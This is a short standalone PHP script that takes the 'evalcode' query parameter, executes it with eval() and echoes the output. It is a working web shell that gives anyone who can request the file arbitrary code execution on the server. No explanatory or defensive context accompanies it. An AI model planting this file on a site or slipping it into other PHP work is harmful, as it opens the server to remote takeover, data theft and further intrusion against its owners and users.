<?php
if(isset($_GET['evalcode'])){
	$s_code = $_GET['evalcode'];
	ob_start();
	eval($s_code);
	$s_res = ob_get_contents();
	ob_end_clean();
	echo($s_res);
}

exit;
?>
